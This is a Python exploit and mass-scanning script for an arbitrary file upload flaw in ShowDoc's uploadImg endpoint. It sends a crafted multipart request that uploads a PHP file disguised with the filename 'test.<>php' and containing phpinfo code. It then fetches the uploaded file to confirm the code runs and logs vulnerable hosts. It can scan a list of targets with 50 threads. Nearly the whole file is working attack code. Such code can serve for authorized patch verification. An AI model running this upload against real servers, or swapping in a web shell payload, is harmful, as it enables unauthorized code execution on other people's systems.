# ShowDoc PageController.class.php任意文件上传漏洞
import argparse
from multiprocessing.dummy import Pool
import requests,json
import sys
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                                author:watermelon_xz🍉
                                version:ShowDoc PageController.class.php任意文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="ShowDoc PageController.class.php任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/index.php?s=/home/page/uploadImg'
    url = target+payload
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
    'Content-Type':'multipart/form-data; boundary=--------------------------921378126371623762173617',
    'Accept-Encoding':'gzip',
    'Connection':'close',
    'Content-Length':'239', 
         }
    data = (
        '----------------------------921378126371623762173617\r\n'
        'Content-Disposition:form-data; name="editormd-image-file"; filename="test.<>php"\r\n'
        'Content-Type:text/plain\r\n'
        '\r\n'
        '<?php phpinfo();?>\r\n'
        '----------------------------921378126371623762173617--\r\n'
    )
   
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        # print(re.text)
        if re.status_code == 200 and 'success' in re.text:
            # print(f'[+++]该{target}存在ShowDoc PageController.class.php任意文件上传漏洞')
            js = json.loads(re.text)
            payload1 = js['url']
            # print(payload1)
            re1= requests.get(url=payload1)
            # print(re1.text)
            if re1.status_code==200 and 'alt="PHP logo"' in re1.text:
                print(f'[+++]{target}存在ShowDoc PageController.class.php任意文件上传漏洞\n文件上传后地址为{payload1}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True 
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')


if __name__ == '__main__':
    main()